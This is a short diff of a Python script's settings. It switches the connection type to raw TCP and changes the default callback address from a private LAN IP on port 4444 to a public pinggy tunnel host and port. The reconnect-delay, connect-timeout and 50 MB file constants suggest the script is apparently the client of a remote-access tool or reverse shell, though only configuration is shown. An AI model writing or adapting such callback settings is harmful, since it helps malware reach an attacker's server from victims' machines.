@@ -40,10 +40,10 @@ import time
 tcp = 'tcp'
 http = 'http'
 https = 'https'
-connection_type = https         # <- https / http / tcp
+connection_type = tcp         # <- https / http / tcp
 
-DEFAULT_IP = '192.168.0.113'
-DEFAULT_PORT = 4444
+DEFAULT_IP = 'ujtfz-103-55-145-173.run.pinggy-free.link'
+DEFAULT_PORT = 42579
 RETRY_DELAY = 1               # seconds between reconnect attempts
 CONNECT_TIMEOUT = 3           # seconds a TCP connect may take before we retry
 MAX_FILE = 50 * 1024 * 1024   # 50 MB
